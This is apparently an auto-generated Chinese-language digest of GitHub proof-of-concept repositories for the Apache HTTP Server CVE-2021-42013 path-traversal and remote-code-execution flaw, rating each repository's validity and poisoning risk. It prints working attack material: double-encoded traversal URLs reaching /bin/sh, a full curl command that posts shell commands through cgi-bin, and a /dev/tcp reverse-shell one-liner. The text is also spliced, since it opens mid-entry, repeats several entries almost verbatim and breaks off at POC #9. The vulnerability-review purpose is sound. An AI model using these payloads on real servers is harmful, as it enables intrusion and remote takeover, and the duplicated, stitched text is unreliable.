**投毒风险：** 漏洞利用代码本身未发现明显的投毒代码。它执行的操作与漏洞描述一致，即尝试利用路径遍历漏洞执行命令。代码逻辑简单直接，没有发现恶意篡改或隐藏行为。因此，投毒风险评估为 0%。

**利用方式：**

1.  **确定目标：** 确定运行 Apache HTTP Server 2.4.49 或 2.4.50 的目标服务器。
2.  **检查配置：** 确认目标服务器是否启用了 CGI 脚本。
3.  **构造 Payload：** 使用包含路径遍历序列的 URL，例如 `/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh`，构造恶意请求。
4.  **发送请求：** 向目标服务器发送 POST 请求，其中包含构造的 URL 和要执行的命令。
5.  **分析结果：** 分析服务器的响应，判断命令是否执行成功。

**项目地址:** [BassoNicolas/CVE-2021-42013](https://github.com/BassoNicolas/CVE-2021-42013)

**漏洞详情:** [CVE-2021-42013](https://nvd.nist.gov/vuln/detail/CVE-2021-42013)

---

## POC #3

**来源**: [CVE-2021-42013-FakhriCRD_Apache-CVE-2021-42013-RCE-Exploit.md](../2021/CVE-2021-42013-FakhriCRD_Apache-CVE-2021-42013-RCE-Exploit.md)

## CVE-2021-42013 - Apache HTTP Server RCE

**漏洞编号:** CVE-2021-42013

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致完全系统入侵和控制

**影响版本:** 2.4.49, 2.4.50

**利用条件:** CGI脚本已启用，且 Alias 指令配置不当，未对外部文件进行 "require all denied" 保护。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-42013 是一个 Apache HTTP Server 中的远程代码执行漏洞。该漏洞是 CVE-2021-41773 的不完整修复。攻击者可以利用路径遍历漏洞读取服务器上的任意文件，如果服务器开启了 CGI 支持，则可能执行任意命令。

**有效性：**
提供的PoC 代码 `exploit.py` 利用 curl 发送带有特殊构造的 URL 的 POST 请求，尝试绕过路径限制并执行命令。URL 包含 `/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh`，其中 `%%32%65` 是 `%2e` 的双重 URL 编码，表示 `.` 字符。这种编码绕过了 Apache 的某些安全检查。如果目标服务器存在漏洞且 CGI 启用，则可以成功执行命令。

**利用方式：**
1.  **路径遍历：** 攻击者使用特制的 URL，其中包含双重编码的 `.` 字符，以绕过路径检查，访问受限目录之外的文件。
2.  **CGI 执行：** 如果服务器的 CGI 脚本已启用，攻击者可以通过访问 `cgi-bin` 目录下的脚本来执行代码。
3.  **命令执行：** 通过 POST 请求的 body 部分，将需要执行的命令传递给服务器。PoC 代码使用 `echo;{command}` 的方式，将命令注入到 shell 中执行。
4.  **反弹shell：** PoC代码可以自动生成反弹shell，从而建立与目标服务器的连接。

**投毒风险：**
该仓库中的投毒风险评估为 10%。虽然利用代码本身实现了漏洞利用的功能，但仍存在潜在的风险：

*   **不明显的恶意代码：** 作者可能在代码中插入不明显的恶意代码，例如收集目标服务器信息、植入后门等。
*   **依赖风险：**  虽然说明中声称没有额外的 Python 依赖，但是依然需要 curl 和 netcat 。curl 本身可能存在安全问题，如果 curl 被替换为恶意版本，可能导致额外的风险。
*   **供应链投毒：** 尽管该 PoC 没有明确的依赖关系，但 GitHub 仓库本身也可能受到供应链攻击的影响，例如账户被盗用并被恶意修改。

总而言之，在使用任何公开的漏洞利用代码时，都应谨慎审查代码，确保其安全性。建议在隔离环境中运行该 PoC 代码，并监控其行为，以防止潜在的恶意行为。

**项目地址:** [FakhriCRD/Apache-CVE-2021-42013-RCE-Exploit](https://github.com/FakhriCRD/Apache-CVE-2021-42013-RCE-Exploit)

**漏洞详情:** [CVE-2021-42013](https://nvd.nist.gov/vuln/detail/CVE-2021-42013)

---

## POC #4

**来源**: [CVE-2021-42013-Hamesawian_CVE-2021-42013.md](../2021/CVE-2021-42013-Hamesawian_CVE-2021-42013.md)

## CVE-2021-42013-Apache HTTP Server-路径遍历和远程代码执行

**漏洞编号:** CVE-2021-42013

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49和2.4.50

**利用条件:** 需要目标服务器运行受影响的Apache HTTP Server版本，且配置允许CGI脚本执行。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-42013是Apache HTTP Server 2.4.49和2.4.50版本中存在的路径遍历漏洞，是CVE-2021-41773的不完整修复。

**有效性分析：**
根据漏洞信息和搜索结果，此漏洞允许攻击者利用路径遍历攻击，将URL映射到Alias指令配置目录之外的文件。如果这些目录之外的文件没有受到“require all denied”的默认配置保护，请求可能会成功。如果CGI脚本对这些别名路径也启用，可能导致远程代码执行。
提供的POC代码使用`curl`命令尝试通过路径遍历读取`/etc/passwd`文件。攻击者通过`cgi-bin`目录，使用编码后的`../`来尝试访问`/etc/passwd`，验证是否存在路径遍历漏洞。

**投毒风险分析：**
查看漏洞利用代码仓库，其中包含用于测试漏洞的curl命令，以及一个README文件，描述了漏洞和版本。并没有发现任何恶意代码，因此投毒风险为0%。

**利用方式：**
1.  **路径遍历：** 攻击者构造包含编码后的路径遍历字符（如`%32%65`代表`.`）的URL，尝试访问受限目录之外的文件。
2.  **条件：** 成功利用的前提是：
    *   目标服务器运行Apache HTTP Server 2.4.49或2.4.50。
    *   受影响的文件没有被`require all denied`配置保护。
    *   CGI脚本已启用。
3.  **远程代码执行（如果满足CGI条件）：** 如果CGI脚本已启用，攻击者可以通过上传恶意CGI脚本并执行，从而实现远程代码执行。

**总结：** 此漏洞的利用依赖于服务器配置。 如果`/etc/passwd`可以读取，代表着高危漏洞利用的开始,可以进行进一步利用,如果CGI可用，那么将可以达成远程代码执行。

**项目地址:** [Hamesawian/CVE-2021-42013](https://github.com/Hamesawian/CVE-2021-42013)

**漏洞详情:** [CVE-2021-42013](https://nvd.nist.gov/vuln/detail/CVE-2021-42013)

---

## POC #5

**来源**: [CVE-2021-42013-K3ysTr0K3R_CVE-2021-42013-EXPLOIT.md](../2021/CVE-2021-42013-K3ysTr0K3R_CVE-2021-42013-EXPLOIT.md)

## CVE-2021-42013 - Apache HTTP Server Path Traversal and Remote Code Execution

**漏洞编号:** CVE-2021-42013

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49, 2.4.50

**利用条件:** 目标服务器运行受影响的 Apache 版本，且允许 CGI 脚本执行，Alias-like directives配置不当。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-42013 是一个存在于 Apache HTTP Server 2.4.49 和 2.4.50 版本中的路径遍历和远程代码执行漏洞。该漏洞是 CVE-2021-41773 的不完整修复。攻击者可以利用该漏洞通过构造恶意的 URL，绕过 Alias-like 指令的限制，访问服务器上受限制的文件。如果目标服务器配置允许 CGI 脚本执行，攻击者可以通过路径遍历执行任意代码。 

**有效性：** 提供的 Python 脚本 `CVE-2021-42013.py` 看起来有效，因为它实现了漏洞的利用过程。

该脚本首先尝试测试目标是否易受攻击，然后利用该漏洞通过 curl 命令发送一个 reverse shell payload。它还在本地启动一个监听器来接收 shell 连接。脚本中使用了 `subprocess.check_output` 执行 curl 命令，并使用线程来同时运行漏洞利用和监听器。

**投毒风险：**

分析提供的代码，存在一些小的投毒风险:

1.  **硬编码的路径:** 脚本中使用了硬编码的 `/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh` 路径。虽然这是漏洞利用的一部分，但如果攻击者修改此路径，可能会导致脚本在非预期目标上执行。
2.  **Reverse Shell Payload:** 使用了 `bash -c '0<&124-;exec 124<>/dev/tcp/{lhost}/{lport};sh <&124 >&124 2>&124'` 作为反向 shell payload。这个 payload 相对常见，但如果攻击者修改此 payload，可能会执行恶意命令，例如下载并执行其他恶意软件。
3.  **User-Agent:**  使用了特定的User-Agent字符串，这可能被用于识别和阻止攻击。攻击者可能会修改 User-Agent 来绕过检测。
4.  **端口硬编码:** 监听端口硬编码为4444,如果目标网络存在端口过滤,或者其他服务占用了4444端口,可能会利用失败,攻击者可能修改端口来绕过防御.

**利用方式：**

1.  **路径遍历:** 攻击者构造包含 `/.%%32%65/.%%32%65` 序列的恶意 URL，绕过 Apache 的路径规范化，从而访问位于 Alias-like 指令配置目录之外的文件。
2.  **CGI 执行:** 如果目标服务器的 `/cgi-bin/` 目录配置为允许执行 CGI 脚本，攻击者可以通过路径遍历访问 `sh` 或其他 shell 解释器。
3.  **远程代码执行:** 攻击者通过构造特定的请求，利用 `sh` 解释器执行任意 shell 命令。通常，攻击者会执行反向 shell 命令，从而在攻击者控制的机器上获得 shell 访问权限。

**缓解措施：**

*   升级到不受漏洞影响的 Apache HTTP Server 版本 (>= 2.4.51)。
*   禁用 CGI 脚本执行，除非绝对必要。
*   配置 Alias-like 指令时，确保使用 `Require all denied` 或其他适当的访问控制，限制对配置目录之外的文件的访问。
*   使用 Web 应用防火墙 (WAF) 检测和阻止包含路径遍历序列的恶意请求。


**项目地址:** [K3ysTr0K3R/CVE-2021-42013-EXPLOIT](https://github.com/K3ysTr0K3R/CVE-2021-42013-EXPLOIT)

**漏洞详情:** [CVE-2021-42013](https://nvd.nist.gov/vuln/detail/CVE-2021-42013)

---

## POC #6

**来源**: [CVE-2021-42013-Makavellik_POC-CVE-2021-42013-EXPLOIT.md](../2021/CVE-2021-42013-Makavellik_POC-CVE-2021-42013-EXPLOIT.md)

# CVE-2021-42013

> 📦 该CVE有 **20** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2021-42013-12345qwert123456_CVE-2021-42013.md](../2021/CVE-2021-42013-12345qwert123456_CVE-2021-42013.md)

## CVE-2021-42013 - Apache HTTP Server Path Traversal and Remote Code Execution

**漏洞编号:** CVE-2021-42013

**漏洞类型:** Path Traversal and Remote Code Execution

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感文件泄露和远程代码执行

**影响版本:** 2.4.49, 2.4.50

**利用条件:** 服务器运行Apache HTTP Server 2.4.49或2.4.50，且存在Alias-like指令配置，CGI脚本已启用并且对Alias路径没有做`require all denied`限制。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-42013是CVE-2021-41773的不完整修复。攻击者可以利用路径遍历漏洞，将URL映射到Alias-like指令配置之外的文件。如果这些目录之外的文件没有受到默认配置"require all denied"的保护，则请求可能会成功。 如果还为这些别名路径启用了CGI脚本，则可能允许远程代码执行。

**漏洞利用方式：**

1.  **路径遍历：** 攻击者利用`..`序列绕过Alias-like指令的限制，访问受限目录之外的文件。
2.  **双URL编码：** 原始的CVE-2021-41773补丁未能正确处理双URL编码的路径。攻击者可以使用双URL编码（例如`%%32%65`代替`.`）来绕过补丁。
3.  **CGI执行：** 如果目标服务器启用了CGI，攻击者可以利用路径遍历访问到诸如`/bin/bash`等可执行文件，并执行任意命令。POC代码中通过POST请求向`/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/bash`发送payload `echo Content-Type: text/plain; echo; id`，该payload会通过bash执行id命令并返回结果。

**有效性：**

提供的POC代码有效，可以利用该漏洞在受影响的Apache HTTP Server版本上执行任意命令。

**投毒风险：**

Dockerfile修改了Apache的配置文件，启用了`mod_cgid`模块，并且将`Require denied`改为了`Require granted`。使得CGI脚本能够执行。作者有一定概率会进行投毒，但是从目前来看，作者只是为了让漏洞更容易复现，并没有发现明显的恶意代码。投毒风险评估为10%，主要是代码仓库所有者信誉未知，存在潜在风险。

**项目地址:** [12345qwert123456/CVE-2021-42013](https://github.com/12345qwert123456/CVE-2021-42013)

**漏洞详情:** [CVE-2021-42013](https://nvd.nist.gov/vuln/detail/CVE-2021-42013)

---

## POC #2

**来源**: [CVE-2021-42013-BassoNicolas_CVE-2021-42013.md](../2021/CVE-2021-42013-BassoNicolas_CVE-2021-42013.md)

## CVE-2021-42013 - Apache HTTP Server Path Traversal 和 RCE

**漏洞编号:** CVE-2021-42013

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，允许未经身份验证的远程攻击者读取任意文件和执行任意代码

**影响版本:** 2.4.49 和 2.4.50

**利用条件:** 目标服务器运行受影响的 Apache 版本，并且启用 cgi 脚本。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

根据漏洞库信息和搜索结果，CVE-2021-42013 是一个 Apache HTTP Server 中的路径遍历和远程代码执行漏洞。此漏洞是 CVE-2021-41773 的不完整修复。攻击者可以利用该漏洞，通过构造包含路径遍历序列（例如 `/.%%32%65`）的 URL，访问服务器上受限目录之外的文件。如果目标启用了 CGI 脚本，攻击者可以利用该漏洞执行任意代码。

**有效性：** 提供的 PoC 代码尝试利用该漏洞。它首先尝试提取目标 URL 的域名或 IP 地址，然后发送一个包含路径遍历序列的 POST 请求到 `/cgi-bin/` 目录，尝试执行指定的 RCE 命令。如果服务器返回 HTTP 状态码 200，则认为 Payload 执行成功，并打印返回结果，否则显示Payload执行失败。

**投毒风险：** 漏洞利用代码本身未发现明显的投毒代码。它执行的操作与漏洞描述一致，即尝试利用路径遍历漏洞执行命令。代码逻辑简单直接，没有发现恶意篡改或隐藏行为。因此，投毒风险评估为 0%。

**利用方式：**

1.  **确定目标：** 确定运行 Apache HTTP Server 2.4.49 或 2.4.50 的目标服务器。
2.  **检查配置：** 确认目标服务器是否启用了 CGI 脚本。
3.  **构造 Payload：** 使用包含路径遍历序列的 URL，例如 `/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh`，构造恶意请求。
4.  **发送请求：** 向目标服务器发送 POST 请求，其中包含构造的 URL 和要执行的命令。
5.  **分析结果：** 分析服务器的响应，判断命令是否执行成功。

**项目地址:** [BassoNicolas/CVE-2021-42013](https://github.com/BassoNicolas/CVE-2021-42013)

**漏洞详情:** [CVE-2021-42013](https://nvd.nist.gov/vuln/detail/CVE-2021-42013)

---

## POC #3

**来源**: [CVE-2021-42013-FakhriCRD_Apache-CVE-2021-42013-RCE-Exploit.md](../2021/CVE-2021-42013-FakhriCRD_Apache-CVE-2021-42013-RCE-Exploit.md)

## CVE-2021-42013 - Apache HTTP Server RCE

**漏洞编号:** CVE-2021-42013

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致完全系统入侵和控制

**影响版本:** 2.4.49, 2.4.50

**利用条件:** CGI脚本已启用，且 Alias 指令配置不当，未对外部文件进行 "require all denied" 保护。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-42013 是一个 Apache HTTP Server 中的远程代码执行漏洞。该漏洞是 CVE-2021-41773 的不完整修复。攻击者可以利用路径遍历漏洞读取服务器上的任意文件，如果服务器开启了 CGI 支持，则可能执行任意命令。

**有效性：**
提供的PoC 代码 `exploit.py` 利用 curl 发送带有特殊构造的 URL 的 POST 请求，尝试绕过路径限制并执行命令。URL 包含 `/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh`，其中 `%%32%65` 是 `%2e` 的双重 URL 编码，表示 `.` 字符。这种编码绕过了 Apache 的某些安全检查。如果目标服务器存在漏洞且 CGI 启用，则可以成功执行命令。

**利用方式：**
1.  **路径遍历：** 攻击者使用特制的 URL，其中包含双重编码的 `.` 字符，以绕过路径检查，访问受限目录之外的文件。
2.  **CGI 执行：** 如果服务器的 CGI 脚本已启用，攻击者可以通过访问 `cgi-bin` 目录下的脚本来执行代码。
3.  **命令执行：** 通过 POST 请求的 body 部分，将需要执行的命令传递给服务器。PoC 代码使用 `echo;{command}` 的方式，将命令注入到 shell 中执行。
4.  **反弹shell：** PoC代码可以自动生成反弹shell，从而建立与目标服务器的连接。

**投毒风险：**
该仓库中的投毒风险评估为 10%。虽然利用代码本身实现了漏洞利用的功能，但仍存在潜在的风险：

*   **不明显的恶意代码：** 作者可能在代码中插入不明显的恶意代码，例如收集目标服务器信息、植入后门等。
*   **依赖风险：**  虽然说明中声称没有额外的 Python 依赖，但是依然需要 curl 和 netcat 。curl 本身可能存在安全问题，如果 curl 被替换为恶意版本，可能导致额外的风险。
*   **供应链投毒：** 尽管该 PoC 没有明确的依赖关系，但 GitHub 仓库本身也可能受到供应链攻击的影响，例如账户被盗用并被恶意修改。

总而言之，在使用任何公开的漏洞利用代码时，都应谨慎审查代码，确保其安全性。建议在隔离环境中运行该 PoC 代码，并监控其行为，以防止潜在的恶意行为。

**项目地址:** [FakhriCRD/Apache-CVE-2021-42013-RCE-Exploit](https://github.com/FakhriCRD/Apache-CVE-2021-42013-RCE-Exploit)

**漏洞详情:** [CVE-2021-42013](https://nvd.nist.gov/vuln/detail/CVE-2021-42013)

---

## POC #4

**来源**: [CVE-2021-42013-Hamesawian_CVE-2021-42013.md](../2021/CVE-2021-42013-Hamesawian_CVE-2021-42013.md)

## CVE-2021-42013-Apache HTTP Server-路径遍历和远程代码执行

**漏洞编号:** CVE-2021-42013

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49和2.4.50

**利用条件:** 需要目标服务器运行受影响的Apache HTTP Server版本，且配置允许CGI脚本执行。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-42013是Apache HTTP Server 2.4.49和2.4.50版本中存在的路径遍历漏洞，是CVE-2021-41773的不完整修复。

**有效性分析：**
根据漏洞信息和搜索结果，此漏洞允许攻击者利用路径遍历攻击，将URL映射到Alias指令配置目录之外的文件。如果这些目录之外的文件没有受到“require all denied”的默认配置保护，请求可能会成功。如果CGI脚本对这些别名路径也启用，可能导致远程代码执行。
提供的POC代码使用`curl`命令尝试通过路径遍历读取`/etc/passwd`文件。攻击者通过`cgi-bin`目录，使用编码后的`../`来尝试访问`/etc/passwd`，验证是否存在路径遍历漏洞。

**投毒风险分析：**
查看漏洞利用代码仓库，其中包含用于测试漏洞的curl命令，以及一个README文件，描述了漏洞和版本。并没有发现任何恶意代码，因此投毒风险为0%。

**利用方式：**
1.  **路径遍历：** 攻击者构造包含编码后的路径遍历字符（如`%32%65`代表`.`）的URL，尝试访问受限目录之外的文件。
2.  **条件：** 成功利用的前提是：
    *   目标服务器运行Apache HTTP Server 2.4.49或2.4.50。
    *   受影响的文件没有被`require all denied`配置保护。
    *   CGI脚本已启用。
3.  **远程代码执行（如果满足CGI条件）：** 如果CGI脚本已启用，攻击者可以通过上传恶意CGI脚本并执行，从而实现远程代码执行。

**总结：** 此漏洞的利用依赖于服务器配置。 如果`/etc/passwd`可以读取，代表着高危漏洞利用的开始,可以进行进一步利用,如果CGI可用，那么将可以达成远程代码执行。

**项目地址:** [Hamesawian/CVE-2021-42013](https://github.com/Hamesawian/CVE-2021-42013)

**漏洞详情:** [CVE-2021-42013](https://nvd.nist.gov/vuln/detail/CVE-2021-42013)

---

## POC #5

**来源**: [CVE-2021-42013-K3ysTr0K3R_CVE-2021-42013-EXPLOIT.md](../2021/CVE-2021-42013-K3ysTr0K3R_CVE-2021-42013-EXPLOIT.md)

## CVE-2021-42013 - Apache HTTP Server Path Traversal and Remote Code Execution

**漏洞编号:** CVE-2021-42013

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49, 2.4.50

**利用条件:** 目标服务器运行受影响的 Apache 版本，且允许 CGI 脚本执行，Alias-like directives配置不当。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-42013 是一个存在于 Apache HTTP Server 2.4.49 和 2.4.50 版本中的路径遍历和远程代码执行漏洞。该漏洞是 CVE-2021-41773 的不完整修复。攻击者可以利用该漏洞通过构造恶意的 URL，绕过 Alias-like 指令的限制，访问服务器上受限制的文件。如果目标服务器配置允许 CGI 脚本执行，攻击者可以通过路径遍历执行任意代码。 

**有效性：** 提供的 Python 脚本 `CVE-2021-42013.py` 看起来有效，因为它实现了漏洞的利用过程。

该脚本首先尝试测试目标是否易受攻击，然后利用该漏洞通过 curl 命令发送一个 reverse shell payload。它还在本地启动一个监听器来接收 shell 连接。脚本中使用了 `subprocess.check_output` 执行 curl 命令，并使用线程来同时运行漏洞利用和监听器。

**投毒风险：**

分析提供的代码，存在一些小的投毒风险:

1.  **硬编码的路径:** 脚本中使用了硬编码的 `/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh` 路径。虽然这是漏洞利用的一部分，但如果攻击者修改此路径，可能会导致脚本在非预期目标上执行。
2.  **Reverse Shell Payload:** 使用了 `bash -c '0<&124-;exec 124<>/dev/tcp/{lhost}/{lport};sh <&124 >&124 2>&124'` 作为反向 shell payload。这个 payload 相对常见，但如果攻击者修改此 payload，可能会执行恶意命令，例如下载并执行其他恶意软件。
3.  **User-Agent:**  使用了特定的User-Agent字符串，这可能被用于识别和阻止攻击。攻击者可能会修改 User-Agent 来绕过检测。
4.  **端口硬编码:** 监听端口硬编码为4444,如果目标网络存在端口过滤,或者其他服务占用了4444端口,可能会利用失败,攻击者可能修改端口来绕过防御.

**利用方式：**

1.  **路径遍历:** 攻击者构造包含 `/.%%32%65/.%%32%65` 序列的恶意 URL，绕过 Apache 的路径规范化，从而访问位于 Alias-like 指令配置目录之外的文件。
2.  **CGI 执行:** 如果目标服务器的 `/cgi-bin/` 目录配置为允许执行 CGI 脚本，攻击者可以通过路径遍历访问 `sh` 或其他 shell 解释器。
3.  **远程代码执行:** 攻击者通过构造特定的请求，利用 `sh` 解释器执行任意 shell 命令。通常，攻击者会执行反向 shell 命令，从而在攻击者控制的机器上获得 shell 访问权限。

**缓解措施：**

*   升级到不受漏洞影响的 Apache HTTP Server 版本 (>= 2.4.51)。
*   禁用 CGI 脚本执行，除非绝对必要。
*   配置 Alias-like 指令时，确保使用 `Require all denied` 或其他适当的访问控制，限制对配置目录之外的文件的访问。
*   使用 Web 应用防火墙 (WAF) 检测和阻止包含路径遍历序列的恶意请求。


**项目地址:** [K3ysTr0K3R/CVE-2021-42013-EXPLOIT](https://github.com/K3ysTr0K3R/CVE-2021-42013-EXPLOIT)

**漏洞详情:** [CVE-2021-42013](https://nvd.nist.gov/vuln/detail/CVE-2021-42013)

---

## POC #6

**来源**: [CVE-2021-42013-Makavellik_POC-CVE-2021-42013-EXPLOIT.md](../2021/CVE-2021-42013-Makavellik_POC-CVE-2021-42013-EXPLOIT.md)

## CVE-2021-42013 - Apache HTTP Server Path Traversal 和远程代码执行

**漏洞编号:** CVE-2021-42013

**漏洞类型:** Path Traversal/远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和服务器控制

**影响版本:** 2.4.49 和 2.4.50

**利用条件:** 服务器运行Apache HTTP Server 2.4.49 或 2.4.50，并且存在可利用的Alias配置或CGI脚本启用

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-42013是Apache HTTP Server 2.4.49和2.4.50版本中存在的路径遍历漏洞，是CVE-2021-41773的不完整修复。攻击者可以利用该漏洞通过构造包含`..`的URL来访问服务器上受限目录之外的文件。如果服务器配置允许CGI脚本在这些别名路径上执行，则可能导致远程代码执行。

**有效性：** 根据漏洞库信息、搜索引擎结果和提供的POC代码描述，该漏洞是真实且有效的。多个来源都证实了该漏洞的存在，以及利用路径遍历实现远程代码执行的可能性。Packetstorm Security 提供了相关的利用代码示例，表明已经存在公开可用的利用方式。

**投毒风险：** 提供的POC代码只是一个README.md文件，描述了一个漏洞扫描、利用和远程交互工具。由于只提供了README.md文件，缺少实际的脚本代码，因此很难准确评估是否存在投毒风险。如果完整的利用代码中包含恶意功能，例如反向shell、持久化后门等，则存在投毒风险。考虑到该漏洞影响较大，且存在公开的利用方式，不排除有人会将恶意代码混入利用工具中进行传播，因此判定存在10%的投毒风险。

**利用方式：** 攻击者通过构造包含`..`序列的恶意URL，绕过Apache HTTP Server的访问限制，读取或执行服务器上任意文件。具体的利用步骤如下：

1.  **路径遍历：** 构造包含多个`../`的URL，尝试访问目标目录之外的文件。例如，`http://target/icons/.%2e/%2e/%2e/%2e/%2e/%2e/%2e/etc/passwd`。
2.  **CGI利用（如果启用）：** 如果目标服务器允许CGI脚本在受影响的Alias路径上执行，攻击者可以利用路径遍历上传一个恶意的CGI脚本，并通过访问该脚本来执行任意命令。
3.  **信息泄露/RCE：** 成功利用漏洞后，攻击者可以读取服务器上的敏感文件（例如/etc/passwd），或者执行任意命令，从而完全控制服务器。

**项目地址:** [Makavellik/POC-CVE-2021-42013-EXPLOIT](https://github.com/Makavellik/POC-CVE-2021-42013-EXPLOIT)

**漏洞详情:** [CVE-2021-42013](https://nvd.nist.gov/vuln/detail/CVE-2021-42013)

---

## POC #7

**来源**: [CVE-2021-42013-Vulnmachines_cve-2021-42013.md](../2021/CVE-2021-42013-Vulnmachines_cve-2021-42013.md)

## CVE-2021-42013-Apache HTTP Server-路径遍历与远程代码执行

**漏洞编号:** CVE-2021-42013

**漏洞类型:** 路径遍历与远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感文件泄露和远程代码执行

**影响版本:** 2.4.49 和 2.4.50

**利用条件:** 需要目标服务器运行受影响的Apache HTTP Server版本，且启用了CGI脚本执行

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-42013 是 Apache HTTP Server 2.4.49 和 2.4.50 版本中存在的路径遍历漏洞，是对 CVE-2021-41773 不完整修复的延续。攻击者可以利用此漏洞，通过构造包含恶意路径的URL，绕过 Alias-like 指令配置的目录限制，访问服务器上的任意文件。如果目标服务器启用了 CGI 脚本，攻击者可能通过上传恶意脚本执行远程代码。

**有效性:** 根据漏洞描述和PoC代码，该漏洞是有效的。PoC代码展示了通过`../`进行路径遍历，读取`/etc/passwd`文件的几种方式，包括对`.`和`/`的URL编码绕过。

**投毒风险:** PoC 代码本身较为简单，仅包含用于验证漏洞的 URL。但考虑到攻击者可能利用此漏洞部署恶意 CGI 脚本，存在一定投毒风险，约10%。README.md文件描述简单，未发现异常。

**利用方式:**
1.  **路径遍历:** 构造包含编码后的`../`的 URL，例如 `/.%2e/.%2e/.%2e/.%2e/etc/passwd`，尝试读取目标服务器上的敏感文件。
2.  **远程代码执行 (RCE):**  如果目标服务器允许执行 CGI 脚本，攻击者可以上传一个包含恶意代码的 CGI 脚本，并通过构造路径遍历 URL 来访问该脚本，从而执行任意命令。

**项目地址:** [Vulnmachines/cve-2021-42013](https://github.com/Vulnmachines/cve-2021-42013)

**漏洞详情:** [CVE-2021-42013](https://nvd.nist.gov/vuln/detail/CVE-2021-42013)

---

## POC #8

**来源**: [CVE-2021-42013-asepsaepdin_CVE-2021-42013.md](../2021/CVE-2021-42013-asepsaepdin_CVE-2021-42013.md)

## CVE-2021-42013 - Apache HTTP Server Path Traversal & Remote Code Execution

**漏洞编号:** CVE-2021-42013

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49, 2.4.50

**利用条件:** 需要目标服务器运行受影响的 Apache HTTP Server 版本，且配置允许 CGI 脚本执行，并存在Alias配置。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-42013 是 Apache HTTP Server 2.4.49 和 2.4.50 版本中存在的路径遍历和远程代码执行漏洞，是 CVE-2021-41773 的不完整修复。攻击者可以利用该漏洞，通过构造包含路径遍历的 URL，访问受限目录之外的文件。如果目标服务器配置了 CGI 脚本执行，则可能进一步实现远程代码执行。

**利用方式：**

1.  **路径遍历：** 攻击者通过构造恶意的 URL，利用 `Alias` 指令配置的路径，绕过访问控制，读取任意文件。
2.  **远程代码执行：** 如果服务器允许 CGI 脚本执行，攻击者可以上传恶意脚本，并利用路径遍历漏洞执行该脚本，从而获得服务器的控制权。

**POC分析：**

提供的 Dockerfile 用于搭建存在漏洞的 Apache HTTP Server 环境。`httpd.conf` 文件可能包含特定的 `Alias` 配置，以便漏洞利用。`cve-2021-42013.sh` 脚本模拟攻击过程，发送包含路径遍历的 HTTP 请求。

脚本的核心代码:
```bash
curl -s --path-as-is -d "echo Content-Type: text/plain; echo; $3" "$1/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/$2"
```
其中, `$1`是目标IP地址, `$2`是要访问的文件路径，`$3`是要执行的命令。
`%%32%65` 是 `%2e` 的双重URL编码，即 `.`（点），用于绕过一些路径过滤机制。`--path-as-is` 参数避免 curl 对路径进行规范化，保持攻击 payload 的原样。
此脚本通过发送POST请求到/cgi-bin目录，利用路径穿越读取任意文件或者执行命令。

**投毒风险评估：**

Dockerfile 中虽然存在从 Apache 官网下载源码的操作，但仍存在一定风险，攻击者可能篡改 Dockerfile，例如，替换下载链接，指向包含恶意代码的 Apache HTTP Server 版本。但从文件内容上判断，直接投毒的可能性较低，更倾向于提供一个可利用的环境。

`cve-2021-42013.sh` 脚本本身相对简单，主要功能是发送 HTTP 请求，利用漏洞。该脚本也可能被修改，例如添加后门，但提供的脚本未发现明显的后门代码。 README.md 文件更多的是漏洞利用的指导说明。

综合评估，投毒风险较低，约为 5%。主要风险在于 Dockerfile 下载源的可靠性以及脚本是否被篡改。

**项目地址:** [asepsaepdin/CVE-2021-42013](https://github.com/asepsaepdin/CVE-2021-42013)

**漏洞详情:** [CVE-2021-42013](https://nvd.nist.gov/vuln/detail/CVE-2021-42013)

---

## POC #9

**来源**: [CVE-2021-42013-bananoname_cve-2021-42013.md](../2021/CVE-2021-42013-bananoname_cve-2021-42013.md)

